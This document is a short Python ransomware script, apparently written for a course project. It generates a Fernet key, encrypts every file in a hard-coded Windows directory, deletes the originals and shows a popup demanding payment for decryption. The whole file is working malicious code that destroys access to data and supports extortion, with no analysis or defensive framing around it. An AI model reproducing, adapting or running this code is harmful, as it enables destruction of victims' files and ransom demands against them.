# Script to encrypt target files

# Imports
import ctypes
import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import ttk
from tkinter import messagebox

# Generate symmetric key
symm_key = Fernet.generate_key()
# Save symmetric key under 'smem-enc'
with open("smem-enc", "wb") as key:
    key.write(symm_key)
# Create Fernet object for encryption operations
fernet_cipher = Fernet(symm_key)

# Directory to encrypt
dir = r'C:\Users\Kel\Desktop\440final\test'

# Encrypt all files in directory
# Loop through files, encrypt, and delete original
for file_name in os.listdir(dir):
    path = os.path.join(dir, file_name)
    # Check if specified path is a file (not directory)
    if os.path.isfile(path):
        # Read file contents
        with open(path, "rb") as file:
            txt = file.read()
        # Encrypt content
        encrypt_text = fernet_cipher.encrypt(txt)
        # Append '.encrypted' to file name and create path for new encrypted file
        encrypted_name = file_name + ".encrypted"
        encrypted_path = os.path.join(dir, encrypted_name)
        # Write content to new file
        with open(encrypted_path, "wb") as encrypted_file:
            encrypted_file.write(encrypt_text)
        # Delete original file
        os.remove(path)

# Popup message
def funny_popup():
    popup = tk.Tk()
    messagebox.showwarning("ATTENTION","lol ur files are encrypted. pay me and i'll decrypt them :)")

# Call popup
funny_popup()